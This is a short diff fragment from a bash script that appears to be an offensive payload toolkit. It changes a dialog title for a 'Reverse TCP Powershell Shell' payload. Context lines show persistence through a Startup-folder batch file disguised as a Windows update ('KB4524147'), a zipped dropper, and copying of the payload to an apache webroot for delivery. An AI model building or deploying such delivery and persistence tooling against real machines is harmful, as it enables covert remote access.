@@ -12405,7 +12405,7 @@ if [ "$persistence" = "Add persistence)" ]; then
       echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence_ID_$random_name.txt
    fi
    echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence_ID_$random_name.txt
-   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence_ID_$random_name.txt" --info > /dev/null 2>&1
+   zenity --title="☠ Reverse TCP Powershell Shell (OpenSSL) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence_ID_$random_name.txt" --info > /dev/null 2>&1
 fi
 sh_menu
 }
@@ -12568,7 +12568,6 @@ cd $IPATH
 ## Copy ALL files to apache2 webroot 
 cd $IPATH/output
 zip $Drop.zip $Drop.$ext.bat > /dev/nul 2>&1
-# zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
